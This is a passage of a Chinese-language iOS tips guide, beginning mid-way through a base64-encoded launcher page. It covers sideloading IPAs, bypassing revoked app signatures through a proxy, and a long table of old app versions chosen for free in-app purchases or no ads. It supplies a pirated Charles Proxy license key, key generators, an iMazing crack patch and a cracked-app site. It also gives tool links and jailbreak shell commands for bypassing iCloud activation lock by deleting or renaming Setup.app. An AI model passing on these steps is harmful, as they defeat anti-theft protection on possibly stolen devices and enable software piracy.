gyU3lrdDRiWGJ5azVyZDIwcFI4eEw2M0lWZGRJZElhZUZ2RXA4V2ZmSC8zVzcxVHhsSWNXSUx2djk3dmUzMDRoMVdzU3puZ2VEY1MrUnByeTZUM2xSdE81VDBsY3UzVytCVDU2K3BQUGhwTEZUa2ZmNkFhV2tKU1A5NnV0NWxvY0FKWDBzT1RkSVFBSWJSaUQzV0NWOXd5NjhweXNCQ2F5ZVFHN0FTRzV0SlM4U25CYmxDRGtDeXdlQUVOOThRS2hLT0szcnpSZEhPWnVSb0pkeWFndDZrWHhlOHZ6MHIrK09UcFp4MWRrdjBrMzNtdFFqYVRMM1c5SDU2RkRiK3A3ODR5U2Q3Y21UTkdVbnBjNjFwWjZIa0RJcjZTRmpLZ0VKYkRxQjNEZVY5RTJQQk05ZkFoSllPb0hjZ0pGaFpCbEJwYXNJUXhjaXZnZ3hFdHVmUnYzV2k0eG5uSFRLb0dXY1ZuY0V2WFk5S1NKUEt6MVRqalY2Q2JRSWNSWDVrditadjN6d0NNbjdRTXQ3eVVmZDJyS1NiemRKYjB1K2UvZGVQUy95NS96cU1jci9FT1IvQmpnM0p3bElRQUlTdUgvZlZ0S05CZ2xJUUFKclNnQVp6a3dWaDFyUzYwZUxkbHJJcTZBWENXKzdwckJmcEpxV2RWcllhYjJ2TGVxUDNlL1BuanhJUHkrQWtvZnlodnF3Sis4RGtsNk9tKzR1Mlo2VUJ3U08yODViL0k5QWtmVDZ3RkRxMzkrWGVqdEpRQUlTMkVRQ3VYY3E2WnQ0OVQxbkNVaGdiUWh3TXg2YWh5cFlXOUozK3F2VGZZV0pqd3NodkZYUXl6WmFxT3RVeW0ybjNQVHBPbE83MkpSOWtPWkx2M2l3bFp6ZmRYdVI3cTBpOGYxV2RNcE1XVWc2L2VTcmFBOUllbzdQL3dxMHJmMjBuck5QYlVVdkxmWElPbVV4cGV6dFgvNHBBUWxJWVBNSTVENm9wRy9ldGZlTUpTQ0IvVVpnUjdpcjZQNWhrZG8vMkg3cE1xY1JlZTkzY2NuMnBMbngwOUtPaVBlSFZDUWZRazJMTzJYU1ozeElubE1PMjJyTFBLTDlyZDJGdmg2enRKZ2o1UFVob0J5ZmZXbTFINnBINm13cUFRbElZTk1JNUI2cnBHL2FsZmQ4SlNDQmZVdUFQdXUwbENPOExHZWlpMHI3a21qV2owdjVCMkNTL0pTNzI4UjJXdDZaRWUwSS9kQStkSGxKM3FTY3c2T09NVlNXNnlRZ0FRa2NaQUpLK2tHK3VwNmJCQ1N3TVFSeU0rZUUyK1ZKQUl6THovcHgyeVlwZDlvOHl6eld0SFV6dndRa0lJRmxFOGc5MFpiMFpaUDNlQktRZ0FSbUpCQjVUcHBpK3IremZyYzAvd2pNSTArTy82Z3kyM3p0OG01MWNKc0VKQ0NCVFNPUWU2bVN2bWxYM3ZPVmdBUWtJQUVKU0VBQ0VsaGJBaXVWOUt0WHIxWXdxY1RhVXJKaUVwQ0FCQ1FnQVFsSVFBSVNXQ0tCK0RHKy9QampqM2RQSDMyNmUrckhUMDA4czk4V2YweXpFd2ZoWUVyNkVxKzBoNUtBQkNRZ0FRbElRQUlTMkRjRVdrbC80b2tubGlmcEhPempqeitwb0ZLSmZVUE5pa3BBQWhLUWdBUWtJQUVKU0dDQkJPTEgrUExTSmYyamp6NnFwNVpLTFBBOExWb0NFcENBQkNRZ0FRbElRQUw3aGtEOEdGOWV1cVJmdm55NWdrb2w5ZzAxS3lvQkNVaEFBaEtRZ0FRa0lJRUZFb2dmNDh0TGwvVDMzMysvbmxvcXNjRHp0R2dKU0VBQ0VwQ0FCQ1FnQVFuc0d3THhZM3g1NlpKKzhlTEZDaXFWMkRmVXJLZ0VKQ0FCQ1VoQUFoS1FnQVFXU0NCK2pDOHZWZElQSFRyVXZmbm1Xd3M4Tll1V2dBUWtJQUVKU0VBQ0VwREEvaWFBTCtQTlN4bUM4ZWpSbzkzaHc0ZTdjK2ZPNzI5cTFsNENFcENBQkNRZ0FRbElRQUlMSklBdjQ4MzQ4elJEbnM4MFRqb0hPWExrU1BmeXkyZTd1M2Z2TGZDMExGb0NFcENBQkNRZ0FRbElRQUw3a3dDZWpDL2p6VXVWOUpNblR5cnArek5tckxVRUpDQUJDVWhBQWhLUXdJSUpJT240OGxJbC9ja2ZQZGs5Kyt4UHV0dTNiOWZUUytmNEJaK3J4VXRBQWhLUWdBUWtJQUVKU0dDdENjU0w4V1I4R1c5ZVNrdDYrdE1jTzNhcysrS0xMeXFrVkdhdGlWazVDVWhBQWhLUWdBUWtJQUVKTEpoQXZCaFB4cGZqenRPa3RVLzZ0V3ZYcHQ0NS9kS3ZYUG13bm1ZcXMrQnp0bmdKU0VBQ0VwQ0FCQ1FnQVFtc05ZRjRNWjQ4UzFjWFpCNC8zOExVcDIyQ1p4Z1p4bng4NDQwM0txUlVacTJKV1RrSlNFQUNFcENBQkNRZ0FRa3NtRUM4R0UrZVpZeDB2THkycFBQSHRHTTNwaVg5OU9uVDNaMDdkK3FwcGtJTFBtK0xsNEFFSkNBQkNVaEFBaEtRd0ZvU2lBL2p4M2p5TEMzcGVIbVY5STgrK21qbS9qTEkrcGRmZmxraHBWSnJTY3hLU1VBQ0VwQ0FCQ1FnQVFsSVlNRUU0c1A0OGJROVZkSm5uWDdzK1BuVzVjdVh1K1BIajgvVUw1M0IyUzljdUZCUE41VmE4TGxidkFRa0lBRUpTRUFDRXBDQUJOYVNRSHdZUDU3bEkwYUlPbDZPbjI5OThNRUh2MkY0bU5qN3BHbTZ2Snc0OFdKMzY5YXRDaW9WVzB0cVZrb0NFcENBQkNRZ0FRbElRQUlMSWhBUHhvdng0MW02dXVEaGVEbCtYaVg5K2VkZW1GclNLU1NpZnZIaXhYcTZxZHlDenQxaUpTQUJDVWhBQWhLUWdBUWtzSllFNHNGNDhheUNqbC9qNVZYUzMzMzMzYi9oYTBpVHRxQzMrWkIwQm1pbk1QdW1yMlc4V0NrSlNFQUNFcENBQkNRZ2dRVVRpS0RqdzNqeExCOHdpbVBqNWZqNTFqdnZ2SFA5MUttZnpTVHBGSmJXOUxOblgzR2tsd1VIZ01WTFFBSVNrSUFFSkNBQkNhd1hnUWo2MTE5LzNlSERlMmxGeDYzeGN2eDhxM1JzZisvbGw4L09MT210cUwvNzdxWDFvbVp0SkNBQkNVaEFBaEtRZ0FRa3NBUUNlUEJlQlIydnhzdng4NjB5MFBxcGMrZk83MW5TS1pTWmNSMlplS3JJazhVU3VIZ0lDVWhBQWhLUWdBUWtJQUVKTEkxQTY3cjRiMXlZWGlaWm5pWEZ5L0h6cmZQbnovOFJ3OFRNVWtpN1QvcW5NMnpNOWV1L0dBRlMxRWNvWEpDQUJDUWdBUWxJUUFJU09BQUVXci9GZS9IZnZmUkRiNTBhTDhmUHQxNTc3YlhmdVhMbHd6MUxPb1ZIMVBsU0VvT3daMnBQSk90TUpTQUJDVWhBQWhLUWdBUWtzTjhJdEY2TDcrSzk4eEowZkJvdng4KzNtQmptWmRaaEdGdnpiMFdkeXI3NTVsdmQ3ZHUzUit3NXFmYkVSaHRja0lBRUpDQUJDVWhBQWhLUXdKb1M2RHNzZm92bjRydnpGUFRSOEl2VjBNc2ZkRTQvZTNadkw0KzJzcDYrT0hTZVAzMzZkUGZaWjU4OUlPZjlFMTNUNjJHMUpDQUJDVWhBQWhLUWdBUTJtRURmV2ZtTjErSzNlRzRhcUZzUDNzc3lQbDVmR28ya256dDM3cnNNdkw2WFFvZjJSZFk1Z1dQSGpuV3Z2dnBxOS9ubm4zZDM3OTU3NkZJSHdGRDZVR1pYU0VBQ0VwQ0FCQ1FnQVFsSVlJOEVocnd6Ni9wRjQ2OTRMRDZMMTg1akZKY2hkOGJIOGZJNCt0YjE2OWYvVWVueVVqOWhPclREWHRhMXJlcVV3N0F5SE91TEwzNDlHbGU5RCtKUnZ3SElGSkRqMGpaUHU1ejhyR1BLYjlKTWoxbzNMdS9RK3ZZWVdjNXhodEtVMGE5RGZxZU0vTzZuN2ZaeHkrelRidXVYTVkvdEtiTTlUcnVjN2YxanRYbFlabXJ6dHN2dHRuWjVYSjUyZlg5NTNQN0p4M2FtL0U0NjZicmtueVhOTVpMMnkyalhaemtwZWJQY1Qvdmx0SG43eS8yOEthdS9mdWozby9LeW5XbG8zMG5YdGZ1M3kremYvbTZYMjdMSHJXL3o3SFc1UFVhV2swNWE5clQ1eDVXYmNwSzIrWWJXc2IyL3Z2OTdraktTcDkxMzNITHl0dWxRM25aZG03ZS8vS2g4MmQ1UEtTZFR5a3llYk12Nk5tM3pUTE0reDhyK1NWTkcrN3RkSHRxZWRXMmFmWksyMithOTNCNGp5MGx6clBaM3U1enRiYnJiOXQyMnRXVmt1YzNmTG1mN0lsT094OVEvUnRZbHpmYjhUc3I2TENkdDEyVy9SNlY3MmJjOVhxMU0rYU5kMXg2N1BVNjd2bDJlSkUrYmY3Zmx0aXlXWjUzdTNMbFRmUlZ2elhEbGkyZzlqMmVmT1BGaWRlVHJ4Y3RIa3M0Q1E3MlVlZTZ0NlRsd0srdWNJRy9COGtXbFY4c1R5YVZMNzNYWHJsMnJUeWg4cWVubXpadTFMenR3ZUhMaFFqaEpRQUlTa0lBRUpDQUJDVWhncndUd1N2d1N6NlJ2T2Q2SmY5SlNqby9pcGZncG5vcXY0cTJMbFBPNE1oNWVoMTU4d05ETGowOC8vZlNmOG9icXM4LytaR0dpVGlXUTlWYllEeDgrM0QzeHhCTjFwdU05LzRWQUhYaWFBQTVmWGFMZkQvTkxMNTNaODN6bXpKbk9XUWJHZ0RGZ0RCZ0R4b0F4WUF4c1JneTAvaGlueEMveFRIeVRselh4VHp3MFRvcWZ0bUllZDQxUXp6dkZmZkZ3Zkx6djZQWDN6My8rOHovblRkVjVIM2hjZVJGMmhxNWhKbC9la3MxVEM1Q1lEeDA2TkFJWGdMT21sT1VzQTJQQUdEQUdqQUZqd0Jnd0JqWW5CdUtVU2VPYWNVODhORTRhUngzbnNQTmVqMy9qNFlPQ3prcjZ3REFjNDZueWRESHZnMDlhWHFBazdjUEsrcjJrS2ROMCsrRklEbkl3Qm93Qlk4QVlNQWFNZ1UyS2dTR1BuTlJWNTUwUDc4YS9IK3FMM2pmMjhrYnBZNWN2WDY1OWNPWmRDY3Q3YW1VUFA3S1h2VEZnREJnRHhvQXhZQXdZQStzVkEvUjV4N3Z4Nzc2VEQvNHV6ZTJ2TWdRTVQxUmV6UFc2bUY0UHI0Y3hZQXdZQThhQU1XQU1HQVA3UHdid2JId2I3eDRVOG5FcjMzNzc3VThYT2RxTHdiWC9nOHRyNkRVMEJvd0JZOEFZTUFhTUFXTmd0aGpBcy9IdGNTNCtkajM5WXQ1OTk5Mi9vUUJiMUdlRGI5REt6Umd3Qm93Qlk4QVlNQWFNQVdPZ2pRRzhHci9Hc3gvWkQzMmNxYk1qaGs5VFBIMW0yZ080Yk1BWkE4YUFNV0FNR0FQR2dERmdEQmdEazhjQVBvMVg0OWN6QzNvcjd2U1ZvVlA3S2tkOU1RQW1Ed0JaeWNvWU1BYU1BV1BBR0RBR2pJSDFpZ0U4R3ArZXVnOTZLK1ZEeTd4MXl2QXdqT080NkE4ZUdWVHJGVlJlRDYrSE1XQU1HQVBHZ0RGZ0RCZ0RzOFVBM293LzQ5RVRqK0l5Sk9PN3JhTlp2dGovbi9ORkpQclNuQ2hmYWZLQ3pYYkI1Q1kzWThBWU1BYU1BV1BBR0RBR0RtNE00TW40TXQ2TVA4K2xlOHR1b3M0MlBsbGFEbnFxUEJIVWZqVm56NTZ0bjFRMTBBNXVvSGx0dmJiR2dERmdEQmdEeG9BeFlBenNIZ1BQUC9kQ2h4ZlQ3eHhQeHBmeDVrZTU5ZHkzODBSUW11Mi9lK0hDaGZkb3dyOXk1Y091TEpjQjJjOTNMNzk4dHZaaFAzbnlaQlY0bXZycExIL3MyTEU2V2d4ZmV2SkM3MzZoNVNNZlk4QVlNQWFNQVdQQUdEQUdWaGNEK0NxanNlQ3ZlQ3craTRqanQvUXh4M2Z4WHZ3WEQ4YUg4V0w4ZUNrdDU1UGEvV3V2dmZZNzU4K2YveU9lR3FqZ08rKzhjNTNoWmFnd001M2xhZksvZXZWcW5hOWR1elphempyVGJUWnlrSU14WUF3WUE4YUFNV0FNR0FPcmk0SFdVL0ZYUERaT2k5L2l1Zmd1M292LzRzR1RPdk1rK2Y0L0k0SWFBU0p3NENRQUFBQUFTVVZPUks1Q1lJST0iIHN0eWxlPSJ3aWR0aDoxMDAlIi8+CiAgPC9kaXY+CjwvYm9keT4KPHNjcmlwdD4KICBpZiAod2luZG93Lm5hdmlnYXRvci5zdGFuZGFsb25lKSB7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibWVzc2FnZSIpLnN0eWxlID0gImRpc3BsYXk6bm9uZSI7CiAgICB2YXIgbGF1bmNoZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibGF1bmNoZXIiKTsKICAgIHZhciBldmVudCA9IGRvY3VtZW50LmNyZWF0ZUV2ZW50KCJNb3VzZUV2ZW50Iik7CiAgICBldmVudC5pbml0TW91c2VFdmVudCgiY2xpY2siKTsKICAgIGxhdW5jaGVyLmRpc3BhdGNoRXZlbnQoZXZlbnQpOwogIH0KPC9zY3JpcHQ+CjwvaHRtbD4K
```

也可通过捷径进行安装。

```
https://www.icloud.com/shortcuts/319f80622c234de8b811b7ba2d5a7228
```

### 电脑端

#### 通过iTunes

将手机连接到电脑，打开iTunes，登录IPA对应的Apple ID，并对此电脑授权。在资源管理器找到要安装的IPA，拖入iTunes手机下`我的设备上`区域即可。

### 掉签IPA处理

打开设置中的无线局域网，点击已连接WiFi后面的菜单键，在最下方选择配置代理。模式选择自动，并将以下地址填入URL中，然后存储。

```
http://ffapple.com
```

设置完毕后断开WiFi，再打开，让手机重连WiFi。在设置中清除Safari历史记录与网站数据，再开启飞行模式，即可通过上述方法安装。

## IPA抓取

### 旧版

抓取旧版软件前，本Apple ID需先下载过该APP。

#### 推荐版本

推荐旧版IPA版本如下。一般一次付费制APP转订阅制APP时，可先下载新版，再降级到旧版已获取免费内购。

|               应用名称               |    版本   |                                                         说明                                                        |
|--------------------------------------|-----------|---------------------------------------------------------------------------------------------------------------------|
| Pyto                                 | 12.1.3    | 内购免费                                                                                                            |
| Scanner Pro                          | 7.7.3     | 内购免费                                                                                                            |
| DAMA                                 | 1.0.17    | 内购免费                                                                                                            |
| 白描                                 | 2.1.6     | 无OCR限制，可批量识别                                                                                               |
| 微盘                                 | 3.3.2     | 有「找资源」按钮的最后一个版本                                                                                      |
|                                      | 3.4.3     | 有搜索功能                                                                                                          |
| 清理君                               | 1.9.4     | 无广告                                                                                                              |
| Annotable                            | 1.11.2    | 内购免费                                                                                                            |
| Price Tag                            | 2.3.1     | 内购免费                                                                                                            |
| 网易云音乐                           | 3.1.1     | 无广告，无视频栏                                                                                                    |
|                                      | 3.7.5     | 无广告，无视频栏，不时弹出更新提醒                                                                                  |
|                                      | 4.0.1     | 无广告，无视频栏                                                                                                    |
|                                      | 4.1.2     | 无视频栏的最后一个版本                                                                                              |
|                                      | 4.3.4     | 全面屏可正常显示，开屏极少广告，无更新提醒                                                                          |
|                                      | 5.7.4     | 视频XR的第一个版本                                                                                                  |
| 微信                                 | 6.1.1     | 有红包功能                                                                                                          |
|                                      | 6.3.9.18  | 可从QQ添加好友的最后一个版本                                                                                        |
|                                      | 6.3.23    | 朋友圈发照片调用照片地理位置信息                                                                                    |
|                                      | 6.6.1     | 支持Callkit的最后一个版本                                                                                           |
|                                      | 6.6.2     | 首个支持切换两个账号的版本                                                                                          |
|                                      | 6.6.7     | 订阅号为瀑布流前的最后一个版本                                                                                      |
|                                      | 6.7.4     | 大版本更新前的最后一个版本                                                                                          |
| 微信Mac版                            | 2.0.5     | 可将公众号文章在内置小窗浏览器打开的最后一个版本                                                                    |
| 皮皮虾                               | 1.3.2     | 无广告                                                                                                              |
| 糗事百科                             | 2.6.4     | 无广告                                                                                                              |
| 今日头条                             | 3.1.1     | 好用                                                                                                                |
| 今日头条Pro                          | 6.3.2     | 有小视频版块，功能齐全，打开很快                                                                                    |
| 哔哩哔哩                             | 5.24.1    | 仍可登录的最旧版本                                                                                                  |
|                                      | 5.33.2    | 关闭启动动画后无开屏广告，但搜索之后下拉内容会卡屏                                                                  |
| TikTok                               | 1.2.2     | 未屏蔽地区的最后一个版本，可以正常观看视频，但无法注册和登录                                                        |
| 腾讯动漫                             | 4.4.5     | 配合会员无限制可随意看，新版会员还需付费                                                                            |
| 百度贴吧                             | 6.7.0     | 广告少                                                                                                              |
|                                      | 6.9.6     | 支持吧内搜索                                                                                                        |
|                                      | 8.9.0     | 首个支持刘海屏的版本                                                                                                |
|                                      | 9.2.0     | 清爽且广告少                                                                                                        |
| 百度贴吧iPad版                       | 2.0.1     | 无广告，能查看别人隐藏的内容                                                                                        |
| 追书神器                             | 2.23.1    | 不需要追书币，有追更模式，无法登录                                                                                  |
|                                      | 2.24.24   | 有广告，但可换源                                                                                                    |
|                                      | 2.25.1    | 可换源                                                                                                              |
| 爱阅书香                             | 4.3.1     | 轻量可换源                                                                                                          |
| 优酷视频                             | 6.12.0    | 无广告                                                                                                              |
| 腾讯视频                             | 5.9.2     | 可绑定王卡以实现免流                                                                                                |
| 爱奇艺                               | 5.7.1     | 无片头广告，仅适用于iOS 10及以下系统                                                                                |
|                                      | 6.8.1     | 登录VIP无需短信验证                                                                                                 |
|                                      | 8.12.5    | 可同时下载3个视频                                                                                                   |
|                                      | 9.8.0     | 启动快，最后一个支持非主设备可以网页扫码登录的版本                                                                  |
| 淘宝                                 | 8.0.0     | 购物车优惠明细查看，支持扫码                                                                                        |
| 咸鱼                                 | 6.3.2     | 无开屏广告，无更新提醒                                                                                              |
| Twitter                              | 7.37.2    | 带翻译功能                                                                                                          |
| 墨迹天气                             | 7.1.6     | 适配iOS11的第一个版本，打开快                                                                                       |
| 和飞信                               | 4.1.1352  | 有漏话拾遗功能的最后一个版本，漏话拾遗功能打开后在游戏时不会被打扰                                                  |
| 天翼云盘                             | 4.5.0     | 无需超级会员即可上传视频的最后一个版本，每日签到可增加空间                                                          |
| 网易漫画                             | 4.2.0     | 越狱用户可以使用Flex3会员补丁                                                                                       |
| 钉钉                                 | 4.3.5     | 支持Callkit的最后一个版本                                                                                           |
| 无忧行                               | 3.8.2     | 支持Callkit的最后一个版本                                                                                           |
| 饿了么                               | 7.21      | 可使用叠加红包                                                                                                      |
| 滴滴出行                             | 5.1       | 首个支持滴滴单车的版本                                                                                              |
| NOMO                                 | 0.9.6     | 新商店前的最后一个版本，切换相机方便                                                                                |
| TIM                                  | 1.1.6     | 功能简洁，启动快                                                                                                    |
| 讯飞输入法                           | 6.0       | 安装包小，输入流畅                                                                                                  |
| 百度输入法                           | 6.0.2     | 可使用超级皮肤，没有剪切板，输入流畅                                                                                |
|                                      | 7.1.1     | 无语音功能                                                                                                          |
| 搜狗输入法                           | 4.0.0     | 输入流畅，支持iOS 11                                                                                                |
|                                      | 5.0.1     | 新功能多，使用流畅                                                                                                  |
| 有道云笔记                           | 5.7.1     | 笔记列表无广告，「我的」界面有广告                                                                                  |
|                                      | 5.9.8     | 云笔记与云协作分开前的最后一个版本，有广告                                                                          |
| 腾讯翻译                             | 3.1       | 无臃肿功能的最后一个版本                                                                                            |
| 唱吧                                 | 8.2       | 流畅稳定，占用内存低                                                                                                |
| 全民K歌                              | 3.7.6     | 流畅稳定                                                                                                            |
| 美图秀秀                             | 6.0.5     | 流畅稳定                                                                                                            |
| 花鸟字                               | 1.2       | 保存真彩色画作，背景画布素材与新版相同                                                                              |
| 文件全能王                           | 5.4       | 支持嗅探式下载音视频，支持m3u8格式下载                                                                              |
| 电视助手                             | 5.5.0     | 支持音视频下载，支持导出文件                                                                                        |
| Persian IDM                          | 1.0       | 无广告，无内购，支持音视频下载                                                                                      |
| 快眼追剧                             | 1.6.2     | 支持云播放                                                                                                          |
| Telegram X                           | 5.0.2     | 无限制屏蔽组                                                                                                        |
| 喜马拉雅FM                           | 5.4.9     | 体积小，启动快                                                                                                      |
| 豆瓣                                 | 4.1.0     | 体积小，启动快                                                                                                      |
| Tumbook                              | 1.3       | Tumblr第三方客户端，带下载功能                                                                                      |
| Tumbot                               | 1.0.5     | 无广告，支持下载视频                                                                                                |
| 指尖浏览器                           | 1.6       | 带下载功能（新版1.9需系统为汉语才有该功能），支持m3u8                                                               |
| 鲨鱼浏览器                           | 1.0       | 支持视频下载，支持m3u8格式下载                                                                                      |
| 知乎                                 | 3.9.0     | 无广告                                                                                                              |
|                                      | 3.10.0    | 无广告，无「通知」按钮，部分功能无法正常使用                                                                        |
|                                      | 3.12.0    | 无广告，有「通知」按钮，部分功能无法正常使用                                                                        |
|                                      | 3.14.0    | 无广告，回答页面可能显示不正确                                                                                      |
|                                      | 3.20.1    | 无广告，有时显示网络错误                                                                                            |
|                                      | 4.4.2     | 回答页面没有广告的最后一个版本                                                                                      |
| 微博                                 | 7.3.1     | 出现首页直播图标前的最后一个版本，评论页无广告                                                                      |
| QQ                                   | 6.5.9     | 安装包小，启动快，不支持新表情查看                                                                                  |
|                                      | 6.6.5     | 安装包小，启动迅速，iOS 12可用                                                                                      |
|                                      | 6.6.8     | 不用会员可美化/更换主题                                                                                             |
|                                      | 6.7.1     | 清爽，有更新提示                                                                                                    |
|                                      | 7.2.5     | 支持iOS 11                                                                                                          |
| QQ音乐                               | 3.9.1     | 可下载收费歌曲，绿钻功能下载高品质音乐可选，仅适用于iOS 10及以下系统                                                |
|                                      | 4.7       | 自带绿钻                                                                                                            |
|                                      | 5.2.2     | 用FLEX可直接下无损格式                                                                                              |
|                                      | 6.1       | 无需会员开DTS                                                                                                       |
|                                      | 6.2       | 占用内存少，启动快                                                                                                  |
|                                      | 6.3.1     | 可以免费使用DTS音效                                                                                                 |
|                                      | 6.5.1     | 可以下载高清MV                                                                                                      |
| QQ空间                               | 5.1.1     | 动态浏览无广告，仅适用于iOS 10及以下系统                                                                            |
| QQ浏览器                             | 6.1.1     | 能缓存视频的最后一个版本                                                                                            |
|                                      | 6.3       | 能关闭头条的最后一个版本                                                                                            |
| 百度网盘                             | 6.6.0     | 支持解压文件，文件可能无法导出                                                                                      |
|                                      | 6.7.3     | 支持重命名后缀和打开分享未知文件                                                                                    |
| 蜻蜓FM                               | 4.7.6     | 无音频广告                                                                                                          |
| UC浏览器                             | 10.5.5    | 无头条，能缓存视频，iOS 11可能会闪退                                                                                |
|                                      | 10.7.11   | 有头条，能缓存视频的最后一个版本，不支持第三方打开                                                                  |
|                                      | 11.3.1    | 可缓存视频，下载文件，首页无广告                                                                                    |
| 虾米音乐                             | 6.1.8     | 随心听自定义模式，支持iOS 11                                                                                        |
| 天天动听                             | 7.9.3     | 能找到的最老的版本                                                                                                  |
|                                      | 8.1.5     | 阿里星球的最后一个版本，仅可作为离线播放器使用                                                                      |
| 酷狗音乐                             | 3.9.4     | 播放器                                                                                                              |
| 酷我音乐                             | 4.9.2     | 可下载无损音质                                                                                                      |
| 多看阅读                             | 3.5.3     | 阅读器，iOS 11上适配有问题                                                                                          |
| Downloads                            | 2.0.0     | 下载视频利器                                                                                                        |
| Aloha                                | 2.0.3     | （中区已下架）视频缓存利器，添加新闻首页前的最后一个版本                                                            |
| Castro                               | 2.6.2     | 各国电台播放器，无订阅限制的最后一个版本                                                                            |
| 高德地图                             | 7.5.8     | 无开屏广告                                                                                                          |
|                                      | 8.0.9     | 没有共享单车                                                                                                        |
|                                      | 8.50.0    | 不弹提醒                                                                                                            |
|                                      | 8.90      | 不卡不发热                                                                                                          |
| 支付宝                               | 9.2       | 越狱后仍可使用指纹支付                                                                                              |
|                                      | 10.1.32   | 启动快，第一个支持通知栏展开付款码的版本                                                                            |
| 威锋网                               | 2.2.11    | 无广告，但会员消息通知打不开                                                                                        |
| Pin                                  | 3.2.2     | 拥有完整xTeko实验室功能的最后一个版本                                                                               |
| Oxford Advanced Learner's Dictionary | 3.53.32   | 牛津高阶英汉第八版，最后一个收费版本                                                                                |
| Merriam-Webster Dictionary           | 2.1       | 无广告，但高版本系统无法安装                                                                                        |
| 美颜相机                             | 5.7.5     | 效果比较自然                                                                                                        |
|                                      | 6.2.6     | 含主题乐园                                                                                                          |
|                                      | 7.1.1     | 有萌拍的第一个版本                                                                                                  |
| TV Assist电视助手                    | 5.5.0     | 支持音视频下载，支持导出文件                                                                                        |
| intoLive Pro                         | 2.0.2     | 用GIF/视频制作30秒动态壁纸                                                                                          |
| 元气骑士                             | 1.6.2     | 同时支持卡无限幻影的BUG和四人联机                                                                                   |
| 触宝电话                             | 5.6.1     | 加入亲情号的版本，广告少                                                                                            |
| TDownloadr                           | 2.6.4     | 支持国内外几乎所有视频下载                                                                                          |
| 秒拍                                 | 6.7.6.8   | 传视频稳定且不会特别压缩面质，新版会自动剪裁视频                                                                    |
| AVPlayer                             | 1.645     | 支持DTS的最后一个版本                                                                                               |
|                                      | 2.50      | 支持AAC打开杜比环绕音效的最后一个版本                                                                               |
| nPlayer                              | 2.6.5     | 支持AAC打开杜比环绕音效，音效比新版好，快拉FLV格式的时候不卡，但不支持DTS                                           |
| Thor                                 | 1.2.0.283 | 直接查看响应中消息体的音视频文件/抓取到的音视频文件，可以播放，支持分享和导出（新版本限制音视频文件直接查看和导出） |
| Alfred                               | 2.8       | 此后的版本和popclip的欧路取词冲突                                                                                   |
| Terminology                          | 3.3.4     | 最后一个收费版                                                                                                      |
| Ulysses                              | 10        | 最后一个非订阅版                                                                                                    |
| 网易新闻                             | 3.6.2     | 广告少                                                                                                              |
| 115网盘                              | 6.0.0     | 支持添加离线下载                                                                                                    |
| K米                                  | 4.3.2     | 无VIP版本                                                                                                           |
| WiFi万能密码                         | 1.2.0     |                                                                                                                     |
| 哔哩哔哩动画                         | 4.7       |                                                                                                                     |
| 体检宝                               | 3.2.81    |                                                                                                                     |
| 手机淘宝                             | 5.7.0     | 比较顺畅且功能齐全                                                                                                  |
| 怪物猎人物语                         | 1.0.1     | 无广告                                                                                                              |

#### 通过爱思助手

爱思助手有安装旧版的功能。

#### 通过软件

适用于Windows。首先安装iTunes12.6.3，该版本是iTunes最后一个有商店的版本。下载链接如下。

```
# 官方下载
https://support.apple.com/zh-cn/HT208079

# 其它
https://www.jianshu.com/p/33bbfaa6acfd
```

如果之前有安装新版的iTunes，换回旧版后运行iTunes时，可能会提示`不能读取文件iTunes Library.itl，因为它是由更高版本的iTunes所创建的`。此时查找iTunes Library.itl并删除该文件即可。

##### IOS旧版App下载工具

下载地址如下。打不开或者打开报错，需安装Microsoft. NET Framework 4.0，双击安装包中的`打不开的请安装.exe`即可。

```
http://www.pc6.com/softview/SoftView_743492.html
http://www.ddooo.com/softdown/165173.htm
```

打开iTunes并登录自己账号，然后点击菜单栏-账户-我的账户，输入密码登录后，在软件上进行配置并启动即可。

##### iOS任意版本号APP下载

下载地址如下，使用方法与上述软件基本一致。

```
https://www.52pojie.cn/thread-1284776-1-1.html
https://www.lanzoux.com/i1BaVhg2m7e
```

#### 通过Charles Proxy

可用于Mac。在Mac上首先需要安装iTunes 12.6.5.3，可通过Retroactive安装。

```
https://github.com/cormiertyshawn895/Retroactive
```

通过以下网站下载Charles Proxy。

```
https://www.charlesproxy.com/download/
```

激活码如下。

```
# 来源为https://juejin.cn/post/6844903733478817800
Registered Name / https://zhile.io
License Key / 48891cf209c6d32bf4

# 激活码计算器
https://www.zzzmode.com/mytools/charles/
https://www.charles.ren/
```


### 已购买但已下架

安装iMazing和破解补丁，补丁链接如下。安装好iMazing后，将补丁复制到iMazing安装根目录，运行补丁，点击patch即可。

```
链接 / https://pan.baidu.com/s/181YRRqo5t2mtx9EYaYRWYg
提取码 / 26fe
```

打开iMazing，连接手机后点击`管理应用程序`，在资料库标签页即可下载已下架的APP，下载完成后右键选择导出IPA即可。导出的IPA可用iMazing或助手类软件安装。

## IPA处理

### 去除旧版更新提示

用解压软件打开IPA，删除iTunesmeradata.plist即可。若无法直接用解压软件打开，可先修改后缀名为ZIP，删除后再修改回IPA。

## 购买AppStore外区礼品卡

将支付宝地区切换为美国，然后点击出境-折扣礼卡，滑到最底部点击查看，搜索`iTunes`即可。

## 相关APP

### 旧版APP

```
https://www.lanzous.com/b0f76484f
https://www.lanzous.com/b0f7a3l6d
```

### 破解APP

```
https://sideload.tweakboxapp.com/
```

### 其他APP

#### DolphiniOS

PPSSPP模拟器。

```
https://dolphinios.oatmealdome.me/
```

#### 其他

```
# uYouPlus
https://github.com/qnblackcat/uYouPlus
```

# 密码与激活锁

当iOS打开了查找我的iPhone功能且无有效的激活记录时，将会导致激活锁定，需要输入开启了查找我的iPhone对应的iCloud账号和密码才可解锁。若忘记密码，则需要绕过激活锁。

若忘记了屏幕密码，则需要绕过屏幕密码锁。

工具可通过以下链接下载。

```
https://appletech752.com/icloudbypass.html
https://appletech752.com/downloads.html
```

```
绕过ID锁，具体操作方法

条件要求：
仅支持A5-A11设备
MAC系统或黑苹果系统
Checkra1n越狱工具（在艾锋降级-在线越狱获取）



操作步骤：
先将设备进入dfu模式
使用Checkra1n进行越狱
在端口44上使用ssh，同时删除或者重命名 Applications文件夹内的setup.app
执行 killall -9 SpringBoard.Boom，注销后即可跳过iCloud。



若是国行机，请往下看： 

执行命令有二个方法：
【方法1】
rm /Library/Preferences/com.apple.networkextension.plist 
killall CommCenter 

【方法2】
mv /Applications/Setup.app/Setup/Applications/Setup.app/Setup.bak touch /Application/Setup.app/Setup 
uicache --all 
killall backboardd 
killall -9 SpringBoard
```

# 软件操作

## Scriptable

配合iOS 14的小组件功能，通过JavaScript脚本使小组件显示相应的内容。

### 懒人配置

#### evilbutcher版

